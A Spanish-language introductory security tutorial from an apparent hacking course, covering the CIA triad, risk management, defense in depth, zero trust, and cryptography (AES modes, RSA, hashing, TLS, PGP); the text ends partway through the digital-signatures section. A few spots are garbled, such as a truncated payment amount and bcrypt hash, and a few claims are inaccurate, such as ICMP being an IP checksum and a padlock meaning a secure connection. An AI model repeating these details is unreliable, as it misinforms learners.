# Fundamentos de Seguridad Informatica

> Documento fundamental para entender los conceptos base de [seguridad informatica](../raw/s3c-f0nd4m3nt0s.md) antes de meterse en los tutoriales de hacking. Si no entendes bien estos temas, vas a estar re perdido. Tomate el tiempo de leer y entender todo.

---

## Indice

> ⏱️ **Tiempo estimado:** 20 horas (~4 sesiones) (3662 lineas)


1. [Conceptos Esenciales](#conceptos-esenciales)
2. [Criptografia](#criptografia)
3. [Autenticacion y Autorizacion](#autenticacion-y-autorizacion)
4. [Tipos de Vulnerabilidades](#tipos-de-vulnerabilidades)
5. [Ciclo de Ataque](#ciclo-de-ataque)
6. [Metodologias de Seguridad](#metodologias-de-seguridad)
7. [Herramientas Esenciales](#herramientas-esenciales)
8. [Laboratorio de Practica](#laboratorio-de-practica)

---

<a name="conceptos-esenciales"></a>
## 1. Conceptos Esenciales

### 1.1 La [triada cia](../raw/s3c-f0nd4m3nt0s.md#triada-cia) (Confidentiality, Integrity, Availability)

La triada CIA es el modelo fundamental de la seguridad de la informacion. Todo sistema seguro busca garantizar estos tres pilares. Si uno solo falla, la seguridad del sistema se viene abajo.

#### Confidencialidad (Confidentiality)

La confidencialidad asegura que la informacion solo sea accesible por quienes estan autorizados a verla. Básicamente, que el que no tiene que ver algo, no lo vea.

**Ejemplos de ataques a la confidencialidad:**
- Un atacante intercepta el trafico de [red](../raw/r3d3s-f0nd4m3nt0s.md) y captura passwords en texto plano (sin cifrar)
- Un empleado despedido se lleva una base de datos de clientes en un pendrive
- Un hacker accede a un bucket de [s3](../raw/cl0ud-h4ck1ng.md#s3) mal configurado y se descarga toda la data
- Un keylogger registra lo que tipea un usuario y manda todo a un servidor externo
- Un ataque de [phishing](../raw/ph1sh1ng.md) engaña a un usuario para que entregue sus credenciales
- Un ataque de "[man-in-the-middle](../raw/m1tm-m0b1l3.md)" donde el atacante se interpone entre dos partes que se comunican
- Una [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) de "path traversal" permite leer archivos fuera del directorio permitido
- Un [sql injection](../raw/w3b-h4ck1ng.md#sql-injection) permite a un atacante leer datos de la base de datos que no deberia ver

**Mecanismos para proteger la confidencialidad:**
- [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) (simetrico y asimetrico) para datos en reposo y en transito
- Control de acceso basado en roles (RBAC)
- Listas de control de acceso (ACL)
- Segmentacion de red
- [ofuscacion](../raw/4pk-r3v3rs1ng.md#obfuscation) de datos y enmascaramiento
- Políticas de pantalla limpia y escritorio bloqueado
- Clasificacion de la informacion (publico, interno, confidencial, secreto)

#### Integridad (Integrity)

La integridad asegura que la informacion no sea modificada de forma no autorizada. Los datos deben ser exactos, completos y no alterados. Básicamente, que lo que ves es lo que realmente es.

**Ejemplos de ataques a la integridad:**
- Un atacante modifica los valores de una transferencia bancaria en transito
- Alguien altera el historial medico de un paciente en una base de datos hospitalaria
- Un virus modifica archivos del sistema para ocultar su presencia
- Un ataque de "man-in-the-middle" modifica paquetes en vuelo
- Un ataque de "ransomware" que cifra archivos y los modifica (aca se pierde integridad y disponibilidad)
- Modificacion de logs para borrar evidencia de un ataque
- Inyeccion de datos falsos en una base de datos
- Alteracion de firmas digitales o certificados

**Mecanismos para proteger la integridad:**
- Hashing criptografico (SHA-256, SHA-3)
- Firmas digitales
- Checksums y sumas de verificacion
- Control de versiones y logs de auditoria
- Restricciones de base de datos (constraints, triggers)
- Integridad referencial en bases de datos
- Control de acceso estricto para escritura/modificacion
- Checksum a nivel de [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) (ICMP) o a nivel de aplicacion

#### Disponibilidad (Availability)

La disponibilidad asegura que la informacion y los sistemas esten accesibles cuando se necesiten. Básicamente, que el sistema responda cuando lo necesitas.

**Ejemplos de ataques a la disponibilidad:**
- Ataque DDoS (Distributed Denial of Service) que satura un servidor web
- Ransomware que cifra archivos y los vuelve inaccesibles
- Ataque de ransomware que tambien borra backups
- Un [exploit](../raw/m3t4spl01t.md#exploits) que crashea un servicio o servidor
- Ataque de "SYN flood" que agota las conexiones disponibles
- Ataque de "[dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) amplification" que satura el ancho de banda
- Borrado [fisico](../raw/ph7s1c4l-r3d.md) de servidores o cables de red
- Ataque a la infraestructura electrica o de refrigeracion de un datacenter
- Ataques de "zero-day" que aprovechan vulnerabilidades para tumbar sistemas
- Desastres naturales que destruyen datacenters

**Mecanismos para proteger la disponibilidad:**
- Redundancia de servidores y balanceo de carga
- Backups regulares y probados
- Planes de recuperacion ante desastres (DRP)
- Sistemas de alta disponibilidad (clustering, failover)
- Proteccion contra DDoS (firewalls, CDN, [rate limiting](../raw/4p1-s3cur1ty.md#rate-limiting))
- Monitoreo continuo y alertas
- Mantenimiento preventivo de hardware
- Generadores electricos y UPS

### 1.2 AAA: Authentication, Authorization, Accounting

El modelo AAA son tres conceptos que van de la mano y aparecen en casi todos lados (sistemas operativos, aplicaciones web, [redes](../raw/r3d3s-f0nd4m3nt0s.md), etc).

**Authentication ([autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion)):** Verificar quien sos. "¿Que usuario es este?"
- Metodos: password, biometricos, tarjetas, certificados, tokens
- Pregunta que responde: "¿Quien es el usuario?"
- Ejemplo: poner usuario y contraseña en el login de una pagina

**Authorization ([autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion)):** Verificar que podes hacer. "¿Que [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) tiene este usuario?"
- Mecanismos: ACLs, roles, permisos, [capabilities](../raw/l1n9x-pr1v3sc.md#linux-capabilities)
- Pregunta que responde: "¿Que puede hacer este usuario?"
- Ejemplo: un usuario normal no puede acceder al panel de administracion

**Accounting (Auditoria/Registro):** Registrar lo que hizo cada usuario. "¿Que hizo y cuando?"
- Mecanismos: logs, eventos, trails de auditoria
- Pregunta que responde: "¿Que hizo este usuario y cuando?"
- Ejemplo: el log del servidor web registra cada request con IP, fecha y recurso accedido

### 1.3 Security Posture

La postura de seguridad es la posicion general de seguridad de una organizacion. Se compone de varios elementos:

**Riesgo (Risk):** La probabilidad de que una amenaza explote una vulnerabilidad y cause un impacto. Formula basica:
`
Riesgo = Amenaza x Vulnerabilidad x Impacto
`
O mas formalmente:
`
Riesgo = Probabilidad x Impacto
`

**Amenaza (Threat):** Algo que puede causar daño. Puede ser:
- Natural: terremoto, inundacion, incendio
- Humano accidental: empleado que borra un archivo sin querer
- Humano intencional: hacker, insider malicioso, cibercriminal
- Tecnica: falla de hardware, bug de software

**Vulnerabilidad (Vulnerability):** Una debilidad en un sistema que puede ser explotada. Ejemplos:
- Software sin parchear
- Configuracion debil (passwords por defecto)
- Diseño inseguro (falta de validacion de inputs)
- Error humano (usuario que usa "123456" como password)

**Impacto (Impact):** La consecuencia si una amenaza explota una vulnerabilidad. Puede ser:
- Financiero: perdida de dinero, multas
- Reputacional: perdida de confianza de clientes
- Legal: demandas, sanciones regulatorias
- Operacional: interrupcion del negocio

**Probabilidad (Likelihood):** Que tan probable es que ocurra un incidente. Se basa en:
- Historial de incidentes previos
- Facilidad de explotacion
- Exposicion de la vulnerabilidad
- Motivacion de los atacantes

### 1.4 Risk Management

La gestion de riesgos es el [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) de identificar, evaluar y controlar los riesgos de seguridad. Tiene cuatro fases principales:

**Identificar:** Encontrar los activos, amenazas y vulnerabilidades.
- Inventario de activos (hardware, software, datos, personas)
- Identificacion de amenazas potenciales
- Identificacion de vulnerabilidades (scanners, auditorias, pentests)
- Mapeo de dependencias entre activos

**Evaluar:** Analizar el riesgo y determinar su nivel.
- Evaluacion cualitativa: usar escalas (Alto, Medio, Bajo) para probabilidad e impacto
- Evaluacion cuantitativa: usar numeros y formulas matematicas
- SLE (Single Loss Expectancy): perdida por un incidente individual
- ARO (Annualized Rate of Occurrence): cuantas veces por año ocurre
- ALE (Annualized Loss Expectancy): SLE x ARO, la perdida anual esperada
- Matriz de riesgo: tabla que cruza probabilidad vs impacto

**Tratar:** Decidir que hacer con el riesgo.
- Mitigar: implementar controles para reducir el riesgo (ej: parchar el sistema)
- Transferir: pasar el riesgo a otro (ej: seguro, outsourcing)
- Aceptar: reconocer el riesgo y no hacer nada (riesgo residual aceptable)
- Evitar: eliminar la causa del riesgo (ej: apagar un servicio innecesario)

**Monitorear:** Mantener vigilancia continua.
- Revision periodica de riesgos
- Monitoreo de amenazas emergentes
- Actualizacion del inventario de activos
- Revision de efectividad de controles

### 1.5 Attack Surface

La superficie de ataque (attack surface) es el conjunto de puntos por donde un atacante puede intentar entrar o extraer datos de un sistema.

**Componentes del attack surface:**
- Puertos abiertos y servicios corriendo
- APIs y endpoints web
- Interfaces de usuario (web, mobile, CLI)
- Conexiones de red ([vpn](../raw/4n0n1m4t0.md#vpn), [wifi](../raw/w1f1-4tt4cks.md), Bluetooth)
- Puertos fisicos (USB, HDMI, serial)
- Personal de la organizacion ([ingenieria social](../raw/ph1sh1ng.md#ingenieria-social))
- Proveedores y terceros (supply chain)

**Reduccion del attack surface:**
- Deshabilitar servicios innecesarios
- Cerrar puertos que no se usen
- Usar firewalls para restringir acceso
- Deshabilitar funciones no utilizadas en software
- Remover software [legacy](../raw/l3g4cy-3nt3rpr1s3.md) y no soportado
- Segmentar la red para aislar sistemas criticos
- Implementar listas blancas de aplicaciones

**Hardening:**
El hardening es el proceso de asegurar un sistema reduciendo su vulnerabilidad. Se aplica a:
- Sistemas operativos: deshabilitar servicios innecesarios, configurar permisos, parchear
- Aplicaciones: configurar correctamente, deshabilitar debug, minimizar funcionalidades
- Redes: firewalls, segmentacion, ACLs, VPNs
- Bases de datos: acceso minimo, cifrado, auditoria
- Contenedores: imagenes minimas, sin privilegios, read-only filesystem

**Minimo Privilegio (Least Privilege):**
El principio de minimo privilegio dice que un usuario o proceso debe tener solo los permisos necesarios para hacer su trabajo, nada mas.
- Un usuario de base de datos solo tiene SELECT si solo necesita leer datos
- Un proceso web corre como un usuario sin permisos de escritura en el sistema
- Un administrador usa una cuenta normal para el dia a dia y una cuenta admin solo cuando necesita

### 1.6 Defense in Depth

La defensa en profundidad (defense in depth) es la estrategia de tener multiples capas de seguridad. Si una capa falla, la siguiente detiene al atacante. Es como una cebolla: muchas capas.

**Capas de seguridad (de afuera hacia adentro):**

**Capa 1 - Politicas y Procedimientos:**
- Politicas de seguridad de la informacion
- Procedimientos de respuesta a incidentes
- Entrenamiento y concientizacion de usuarios
- Evaluaciones de riesgo periodicas

**Capa 2 - Seguridad Fisica:**
- Guardias de seguridad
- Cerraduras y candados biometricos
- Camaras de vigilancia
- Control de acceso a instalaciones
- Detectores de movimiento

**Capa 3 - Seguridad Perimetral:**
- Firewalls de red y next-gen firewalls
- Sistemas de prevencion de intrusiones ([ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips))
- VPN de acceso remoto
- Filtrado de contenido web
- Sistemas antimalware en el gateway

**Capa 4 - Seguridad de Red:**
- Segmentacion de red (VLANs, subnets)
- NAC (Network Access Control)
- Monitoreo de trafico de red
- Deteccion de anomalias en la red
- 802.1X para autenticacion de dispositivos

**Capa 5 - Seguridad de Host:**
- Antivirus y EDR (Endpoint Detection and Response)
- Hardening del [sistema operativo](../raw/0s-f0nd4m3nt0s.md#sistemas-operativos)
- [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls) basado en host
- Parches y actualizaciones
- Control de aplicaciones (whitelisting)

**Capa 6 - Seguridad de Aplicaciones:**
- Secure SDLC (ciclo de vida de desarrollo seguro)
- Pruebas de seguridad (SAST, DAST, IAST)
- Web Application Firewalls (WAF)
- Validacion de entrada y salida
- Autenticacion y autorizacion robusta

**Capa 7 - Seguridad de Datos:**
- Cifrado de datos en reposo (bases de datos, discos)
- Cifrado de datos en transito ([tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls), SSH)
- Enmascaramiento de datos
- Clasificacion de datos
- DLP (Data Loss Prevention)
- Gestion de claves (HSM, KMS)

### 1.7 Zero Trust

Zero Trust es un modelo de seguridad que parte de la base de que no se confia en nadie, ni adentro ni afuera de la red. "Never trust, always verify" (nunca confies, siempre verifica).

**Principios de Zero Trust:**
- Asumir que ya hay un atacante en la red
- No confiar automaticamente en dispositivos o usuarios internos
- Verificar cada solicitud de acceso sin importar su origen
- Acceso con minimos privilegios
- Microsegmentacion de la red

**Microsegmentacion:**
En lugar de tener una red interna confiable y una externa no confiable, la microsegmentacion divide la red en pedacitos chicos. Cada segmento tiene sus propias politicas de seguridad. Una aplicacion web, por ejemplo, tiene:
- Segmento para el frontend
- Segmento para el backend
- Segmento para la base de datos
- Cada uno con reglas de firewall especificas

**BeyondCorp (Google):**
BeyondCorp es el modelo de Zero Trust de Google. La idea es que los empleados puedan trabajar desde cualquier lado sin necesidad de VPN. El acceso se basa en:
- Identidad del usuario (quien es)
- Dispositivo (que dispositivo usa, si esta parcheado)
- Contexto (desde donde se conecta, a que hora, a que recurso)
- Politica: todo esto se evalua en cada solicitud

**Componentes clave de Zero Trust:**
- Policy Decision Point (PDP): decide si se permite el acceso
- Policy Enforcement Point (PEP): ejecuta la decision
- Identity Provider (IdP): autentica usuarios
- Device Inventory: catalogo de dispositivos confiables
- SIEM/SOAR: monitoreo y respuesta automatizada

### 1.8 Principios de Seguridad

Estos son principios fundamentales que guian el diseño de sistemas seguros:

**Minimo Privilegio (Least Privilege):**
Ya lo vimos arriba, pero es tan importante que merece repetirse. Cada usuario, proceso o sistema debe tener solo los permisos necesarios para funcionar.

**Defensa en Profundidad (Defense in Depth):**
Multiples capas de seguridad para que si una falla, las otras protejan.

**Fallo Seguro (Fail Safe):**
Cuando un sistema falla, debe fallar de forma segura. Ejemplos:
- Si un firewall crashea, debe bloquear todo el trafico (fail closed), no permitir todo (fail open)
- Si un sistema de control de acceso falla, las puertas deben quedar cerradas
- Si una autenticacion falla, se niega el acceso por defecto

**Economia de Mecanismo (Economy of Mechanism):**
Los sistemas deben ser simples y pequeños. Cuanto mas complejo es un sistema, mas probable es que tenga errores de seguridad. Mantener las cosas simples:
- Menos codigo = menos bugs
- Menos features = menos superficie de ataque
- Diseños simples son mas faciles de auditar y verificar

**Aceptacion Media (Least Astonishment):**
El sistema debe comportarse de forma que los usuarios no se sorprendan. Las acciones deben ser predecibles y consistentes. Si algo parece que va a hacer X, debe hacer X, no Y. Ejemplo:
- Si hago clic en "Enviar", el formulario se envia, no se borran los datos
- Si veo un candado en el [navegador](../raw/br0ws3r-3xpl01t4t10n.md), la conexion es segura
- Si el sistema pide confirmacion antes de una accion destructiva, la confirmacion debe ser clara

**Separacion de Privilegios (Separation of Duties):**
Una tarea critica debe requerir a dos o mas personas. Ejemplos:
- Para autorizar un pago de +,000 se necesitan dos firmas
- Un administrador de base de datos no debe ser el mismo que el auditor
- Para desplegar a produccion, una persona hace el deploy y otra lo aprueba
- Para acceder a la sala de servidores se necesitan dos tarjetas

**Eslabon mas Debil (Weakest Link):**
La seguridad de un sistema es tan fuerte como su eslabon mas debil. El atacante va a encontrar y atacar el punto mas vulnerable. Ejemplos:
- Podes tener el mejor firewall del mundo, pero si un usuario usa "password123", es al pedo
- Podes tener todos los sistemas parcheados, pero si dejas un [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) fisico abierto en la sala de servidores...
- Podes tener cifrado de punta a punta, pero si compartis la clave por WhatsApp...
- Podes tener el codigo mas seguro, pero si un empleado conecta un USB infectado...

**Privacidad por Diseño (Privacy by Design):**
La privacidad debe ser considerada desde el diseño del sistema, no como un addon:
- Proactiva, no reactiva
- Privacidad como configuracion por defecto
- Privacidad incorporada en el diseño
- Funcionalidad completa (suma positiva, no suma cero)
- Seguridad de punta a punta
- Visibilidad y transparencia
- Respeto por la privacidad del usuario

**No Confiar en la Entrada del Usuario (Never Trust User Input):**
Toda entrada del usuario debe ser validada:
- Validacion del lado del servidor (nunca del lado del cliente solo)
- [sanitizacion](../raw/s3c-f0nd4m3nt0s.md#sanitizacion) de inputs
- Parametrizacion de consultas SQL
- Escape de caracteres especiales
- Limites de longitud y tipo de dato

---

<a name=\"criptografia\"></a>
## 2. [criptografia](../raw/crypt0-f0r-h4ck3rs.md)

La criptografia es la base de la seguridad moderna. Sin [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado), todo lo que hacemos en internet seria publico. Este es un tema pesado pero fundamental.

### 2.1 Cifrado Simetrico

El cifrado simetrico usa la misma clave para cifrar y descifrar. Es rapido y eficiente, pero el problema es compartir la clave de forma segura.

**[aes](../raw/crypt0-f0r-h4ck3rs.md#aes) (Advanced Encryption Standard):**
Es el estandar de cifrado simetrico mas usado del mundo. Originalmente se llamaba Rijndael.

- Tamaños de clave: 128, 192, 256 bits. AES-128 da 128 bits de seguridad, AES-192 da 192, AES-256 da 256.
- Tamaño de bloque: 128 bits siempre
- Es un cifrado de bloques (block cipher): parte los datos en bloques de 128 bits y los cifra uno por uno
- Es el algoritmo recomendado por el gobierno de EE.UU. para informacion clasificada
- AES-256 se considera seguro incluso contra ataques cuanticos (con claves mas largas)

**Usos comunes de AES:**
- Cifrado de discos: BitLocker, FileVault, LUKS
- Cifrado de archivos: 7-Zip, WinRAR, VeraCrypt
- Wi-Fi: [wpa2](../raw/w1f1-4tt4cks.md#wpa2)/WPA3 usan AES (CCMP)
- [vpn](../raw/4n0n1m4t0.md#vpn): IPsec usa AES para cifrar el trafico
- [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls): puede usar AES en modo GCM
- Bases de datos: Transparent Data Encryption (TDE) en SQL Server

**ChaCha20:**
Es un cifrado de flujo (stream cipher) diseñado por Daniel J. Bernstein.

- Es mas rapido que AES en hardware sin aceleracion AES-NI
- Se usa mucho en moviles (es mas eficiente)
- La usa Google para TLS (en [android](../raw/4db-d33p-d1v3.md) y Chrome)
- Es parte del [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)) de cifrado de WhatsApp
- Tamaño de clave: 256 bits
- Se combina con Poly1305 para [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) (ChaCha20-Poly1305)

**DES (Data Encryption Standard):**
- Desarrollado por IBM en los 70s
- Clave de 56 bits: hoy se rompe en minutos con hardware moderno
- Tamaño de bloque: 64 bits
- Fue el estandar hasta los 90s
- Hoy es considerado inseguro. Un ataque de [fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta) contra DES-56 se puede hacer en menos de un dia con hardware dedicado

**3DES (Triple DES):**
- Aplica DES tres veces con diferentes claves
- Clave efectiva: 112 bits (2 claves) o 168 bits (3 claves)
- Sigue usado en sistemas [legacy](../raw/l3g4cy-3nt3rpr1s3.md) (tarjetas de credito, cajeros)
- Es lento comparado con AES
- Vulnerable a ataques de meet-in-the-middle
- Se recomienda migrar a AES

**Blowfish:**
- Diseñado por Bruce Schneier en 1993
- Tamaño de bloque: 64 bits
- Tamaño de clave [variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables): 32 a 448 bits
- Rapido y gratuito
- Usado en algunos [sistemas legacy](../raw/l3g4cy-3nt3rpr1s3.md)
- Su sucesor es Twofish (finalista del AES)
- Bloque de 64 bits lo hace vulnerable a birthday bound con grandes volumenes

**Modos de operacion:**
Los cifrados de bloque como AES necesitan un "modo de operacion" para cifrar mas de un bloque.

**ECB (Electronic Codebook):**
- El modo mas basico. Cada bloque se cifra de forma independiente
- Problema: bloques identicos producen cifrado identico
- Esto revela patrones en los datos. Una imagen cifrada con ECB todavia muestra las siluetas
- NUNCA uses ECB para nada serio

**CBC (Cipher Block Chaining):**
- Cada bloque se XORea con el bloque cifrado anterior antes de cifrarse
- Necesita un IV (Initialization Vector) para el primer bloque
- El IV debe ser aleatorio unico para cada cifrado
- Si usas el mismo IV dos veces con la misma clave, perdes seguridad
- Vulnerable a padding oracle attack si se implementa mal

**GCM (Galois/Counter Mode):**
- Modo que combina cifrado con autenticacion (AEAD)
- Usa un contador que se incrementa, combinado con autenticacion Galois
- Provee confidencialidad E integridad en un solo paso
- Es el modo recomendado hoy para TLS 1.2 y 1.3
- Muy rapido en hardware con AES-NI
- Necesita un nonce de 12 bytes (recomendado)

**CTR (Counter):**
- Convierte un cifrado de bloque en un cifrado de flujo
- Cifra un contador que se incrementa y el resultado se XORea con los datos
- Es paralelizable
- No provee autenticacion por si solo (se necesita un MAC aparte)
- Si se reusa el mismo contador con la misma clave, se pierde toda seguridad

**CCM (Counter with CBC-MAC):**
- Combina CTR con CBC-MAC para autenticacion
- Es un modo AEAD (autenticado)
- Se usa en Wi-Fi WPA2 (CCMP)
- Es mas lento que GCM porque requiere dos pasadas

**IV y Nonce:**
- IV: se usa en modos como CBC. Debe ser impredecible (aleatorio)
- Nonce: se usa en modos como GCM y CTR. Debe ser unico por clave
- Nunca uses el mismo IV/nonce dos veces con la misma clave
- El IV/nonce no es secreto, se transmite junto con el texto cifrado

### 2.2 Cifrado Asimetrico (Clave Publica)

El cifrado asimetrico usa un par de claves: una publica (que se comparte) y una privada (que se mantiene secreta). Es mas lento que el simetrico pero resuelve el problema de intercambio de claves.

**[rsa](../raw/crypt0-f0r-h4ck3rs.md#rsa) (Rivest-Shamir-Adleman):**
- Inventado en 1977 por Ron Rivest, Adi Shamir y Leonard Adleman
- Basado en la dificultad de factorizar numeros grandes
- Seguridad: 2048 bits es el minimo recomendado hoy. 4096 es mejor
- El algoritmo:
  1. Elegir dos primos grandes p y q
  2. Calcular n = p * q (modulo, parte de la clave publica)
  3. Calcular φ(n) = (p-1)(q-1)
  4. Elegir e (exponente publico, tipicamente 65537)
  5. Calcular d (exponente privado) tal que e*d ≡ 1 mod φ(n)
  6. Clave publica: (n, e). Clave privada: (n, d)
- Cifrado: c = m^e mod n
- Descifrado: m = c^d mod n
- Se usa para: cifrado de datos pequeños, firma digital, intercambio de claves
- En la practica, RSA se usa para cifrar una clave simetrica, no los datos completos

**ECC (Elliptic Curve [cryptography](../raw/crypt0-f0r-h4ck3rs.md)):**
- Usa curvas elipticas sobre campos finitos
- Ofrece la misma seguridad que RSA pero con claves mucho mas cortas
- Comparacion de seguridad:
  - RSA 2048 bits ≈ ECC 224 bits
  - RSA 3072 bits ≈ ECC 256 bits
  - RSA 7680 bits ≈ ECC 384 bits
  - RSA 15360 bits ≈ ECC 521 bits
- Es mas rapido que RSA para la misma seguridad
- Se usa mucho en moviles y sistemas embebidos
- Curvas comunes: P-256 (secp256r1), P-384, P-521, Curve25519, secp256k1 (Bitcoin)
- Se usa en: TLS, SSH, Bitcoin/Ethereum, firmas digitales modernas

**Diffie-Hellman (DH):**
- No es un algoritmo de cifrado, es un protocolo de intercambio de claves
- Permite a dos partes acordar una clave secreta compartida a traves de un canal inseguro
- Alice y Bob acuerdan un primo p y un generador g (publico)
- Alice elige a secreto, calcula A = g^a mod p, lo envia a Bob
- Bob elige b secreto, calcula B = g^b mod p, lo envia a Alice
- Alice calcula s = B^a mod p
- Bob calcula s = A^b mod p
- Ambos llegan al mismo s sin que nadie mas pueda calcularlo
- Vulnerable a [mitm](../raw/m1tm-m0b1l3.md) si no se autentica
- ECDH usa curvas elipticas

**Firma Digital (Digital Signature):**
- Es como una firma manuscrita pero para datos digitales
- Provee: autenticacion, integridad, no repudio
- [proceso](../raw/0s-f0nd4m3nt0s.md#procesos):
  1. Se calcula el [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) del mensaje
  2. El hash se cifra con la clave privada del firmante
  3. Cualquiera puede verificar usando la clave publica

### 2.3 Hashing

El hashing es una [funcion](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#funciones) unidireccional: toma un input de cualquier tamaño y produce un output de tamaño fijo (hash/digest). No se puede revertir.

**Propiedades de una funcion de hash criptografico:**
- Unidireccional (preimage resistance): dado un hash, es computacionalmente imposible encontrar el input
- Resistencia a segunda preimagen: dado un input, es imposible encontrar otro input que de el mismo hash
- Resistencia a colisiones: es imposible encontrar dos inputs diferentes que den el mismo hash
- Efecto avalancha: cambiar un bit del input cambia ~la mitad de los bits del output

**MD5 (Message Digest 5):**
- Produce 128 bits (16 bytes)
- Diseñado en 1991 por Ron Rivest
- Totalmente roto: colisiones en segundos
- No se debe usar para seguridad. Solo para checksums no criticos

**SHA1 (Secure Hash Algorithm 1):**
- Produce 160 bits (20 bytes)
- Diseñado por la NSA en 1995
- Colisiones demostradas en 2017 (SHAttered)
- No se debe usar para nada de seguridad. Deprecado desde 2010

**SHA256 (Secure Hash Algorithm 256):**
- Produce 256 bits (32 bytes)
- Parte de la familia SHA-2 (diseñada por la NSA)
- Es el estandar actual. Se considera seguro
- Se usa en: Bitcoin, TLS, SSH, firmas digitales, Git

**SHA3 (Keccak):**
- Ganador de la competencia de [nist](../raw/p3nt3st-m3th0d0l0gy.md#nist) en 2012
- Estructuralmente diferente a SHA-2 (sponge construction)
- No reemplaza a SHA-256, es una alternativa
- SHA3-224, SHA3-256, SHA3-384, SHA3-512
- SHAKE128 y SHAKE256 (funciones extensibles)

**bcrypt:**
- Diseñado para hashing de contraseñas (lento a proposito)
- Incorpora salt automaticamente
- Parametro de work factor (cost)
- Ejemplo: /cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW
- Resistente a GPU (pero no tanto como scrypt/argon2)

**scrypt:**
- Diseñado para ser costoso en memoria (memory-hard)
- Hace que ataques con GPU/ASIC sean mucho mas caros
- Usado en: Litecoin, algunas criptomonedas
- Parametros: N (CPU/memory cost), r (block size), p (parallelization)

**argon2:**
- Ganador de la competencia de hashing de contraseñas en 2015
- Es el estandar moderno
- Tres variantes: Argon2d, Argon2i, Argon2id (recomendado)
- Parametros: tiempo, memoria, paralelismo

**PBKDF2 (Password-Based Key Derivation Function):**
- Aplica HMAC muchas veces
- No es memory-hard, vulnerable a GPU/ASIC
- Se usa en: WPA/WPA2, [ios](../raw/10s-p3nt3st1ng.md), Signal
- Parametros: algoritmo, iteraciones, salt, longitud

**Colisiones:**
Dos inputs diferentes producen el mismo hash. Para una funcion de n bits, encontrar colision requiere ~2^(n/2) intentos (birthday attack).
- MD5: colisiones practicas en segundos
- SHA1: colisiones practicas demostradas
- SHA256: no hay colisiones publicas conocidas
- Las colisiones permiten falsificar firmas y certificados

**Rainbow Tables:**
Tablas precomputadas de hashes para invertir hashes rapidamente.
- Usan cadenas de reduccion para comprimir la tabla
- Trade-off: tiempo vs espacio
- Una rainbow table para todos los passwords alfanumericos de 8 caracteres pesa ~500GB
- Defensa: usar salt (cada password tiene un salt unico)

**Salt:**
Valor aleatorio que se agrega a la contraseña antes de hashearla. Unico por usuario.
- Si dos usuarios tienen la misma contraseña, los hashes son diferentes
- Las rainbow tables se vuelven inutiles
- El salt se almacena junto con el hash (no es secreto)
- Tamaño tipico: 16-32 bytes con CSPRNG

**Por que se usa hashing para contraseñas y no cifrado:**
- El cifrado es reversible (si tenes la clave, podes descifrar)
- Si alguien roba la BD de passwords cifrados y la clave, tiene todo
- El hashing no es reversible: el sistema nunca almacena la password original
- Cuando el usuario se loguea, se hashea su input y se compara
- Si roban los hashes, no pueden obtener las passwords (en teoria)

### 2.4 Criptografia Hibrida

En la practica se combina cifrado simetrico y asimetrico (criptografia hibrida).

**TLS/[ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls) (Transport Layer Security):**
TLS es el protocolo que asegura [https](../raw/r3d3s-f0nd4m3nt0s.md#https).

**Componentes de TLS:**
- Certificado digital: vincula una identidad (dominio) con una clave publica
- Autoridad Certificadora (CA): entidad que firma los certificados
- Chain of trust: cadena de confianza desde la raiz hasta el certificado

**[handshake](../raw/w1f1-4tt4cks.md#handshake) TLS:**
1. Client Hello: el [navegador](../raw/br0ws3r-3xpl01t4t10n.md) envia versiones y cifrados soportados
2. Server Hello: el servidor elige opciones y envia su certificado
3. Client verifica el certificado contra la CA
4. Key Exchange: con asimetrico acuerdan una clave simetrica
5. Toda la comunicacion se cifra con simetrico (AES-GCM, ChaCha20)
6. Con TLS 1.3, el handshake es 1-RTT

**Tipos de certificados:**
- Domain Validation (DV): solo verifica que controlas el dominio
- Organization Validation (OV): verifica que la organizacion existe
- Extended Validation (EV): verificacion exhaustiva
- Wildcard: cubre *.ejemplo.[com](../raw/w1n-s9bsyst3ms.md#com)
- SAN: cubre multiples dominios

**Let's Encrypt:**
- CA gratuita y automatizada
- Usa ACME para automatizar renovacion
- Certificados validos por 90 dias
- Revoluciono HTTPS en la web

**SSH (Secure Shell):**
- Protocolo para acceso remoto seguro
- Reemplaza a Telnet (todo en texto plano)
- Usa criptografia hibrida
- Autenticacion: password o clave publica

**Autenticacion con clave publica SSH:**
1. El usuario genera un par de claves: ssh-keygen
2. La clave publica se copia al servidor en ~/.ssh/authorized_keys
3. El servidor reta al cliente a firmar un mensaje con su clave privada
4. Si la firma es valida, se permite el acceso

**PGP (Pretty Good Privacy):**
- Creado por Phil Zimmermann en 1991
- Estandar para cifrado y firma de correos y archivos
- GnuPG (GPG) es la implementacion libre mas usada

**Funcionamiento de PGP:**
- Cada usuario tiene un par de claves RSA o ECC
- Las claves publicas se comparten via Web of Trust
- Para enviar mensaje cifrado:
  1. Se genera una clave simetrica aleatoria (session key)
  2. El mensaje se cifra con la clave simetrica
  3. La clave simetrica se cifra con la clave publica del destinatario
  4. Todo se envia junto
- Para firmar:
  1. Se calcula el hash del mensaje
  2. El hash se cifra con la clave privada
  3. Mensaje + firma se envian

### 2.5 Firmas Digitales

Las firmas digitales verifican la autenticidad e integridad de un mensaje o documento digital.

**Como funcionan:**
1. El firmante calcula el hash del mensaje (ej: SHA-256)
2. El hash se cifra con la clave privada del firmante
3. El mensaje original + la firma se envian al destinatario
